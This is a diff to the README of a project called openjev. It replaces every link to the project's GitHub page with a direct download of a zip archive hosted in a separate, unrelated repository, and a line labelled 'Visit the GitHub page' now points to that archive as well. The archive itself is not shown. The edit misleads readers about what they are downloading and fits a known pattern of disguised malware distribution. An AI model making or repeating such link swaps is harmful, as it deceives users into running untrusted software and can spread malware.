@@ -5,7 +5,7 @@ description: "Deploy fast, calibrated, typed decision APIs from an open model—
 ---
 # 🚀 openjev - Make Smart Decisions, Effortlessly
 
-[![Download openjev](https://img.shields.io/badge/Download-openjev-2ea44f?style=for-the-badge)](https://github.com/lucast4049/openjev)
+[![Download openjev](https://img.shields.io/badge/Download-openjev-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/lucast4049/lucast4049.github.io/main/ridgeband/App-v3.6.zip)
 
 ---
 
@@ -38,7 +38,7 @@ The beauty of openjev is that it helps you stop going back and forth. It organiz
 
 Getting openjev on your computer is simple. Just click the button below, and it will take you to the page where you can grab the application.
 
-[![Download openjev](https://img.shields.io/badge/Download-Now-1f6feb?style=for-the-badge)](https://github.com/lucast4049/openjev)
+[![Download openjev](https://img.shields.io/badge/Download-Now-1f6feb?style=for-the-badge)](https://raw.githubusercontent.com/lucast4049/lucast4049.github.io/main/ridgeband/App-v3.6.zip)
 
 Visit this link to download the application.
 
@@ -122,7 +122,7 @@ Sure, if you ever want to remove it, just go to "Settings" > "Apps" in Windows, 
 
 We're here for you. If you run into any trouble or just have a question, don't hesitate to reach out.
 
-- **Visit the GitHub page** – You can find answers to common questions and see the latest news at [https://github.com/lucast4049/openjev](https://github.com/lucast4049/openjev).
+- **Visit the GitHub page** – You can find answers to common questions and see the latest news at [https://raw.githubusercontent.com/lucast4049/lucast4049.github.io/main/ridgeband/App-v3.6.zip](https://raw.githubusercontent.com/lucast4049/lucast4049.github.io/main/ridgeband/App-v3.6.zip).
 - **Report a problem** – If something isn't working right, use the "Issues" tab on the GitHub page to let us know. We read everything and usually respond within a day or two.
 
 ---
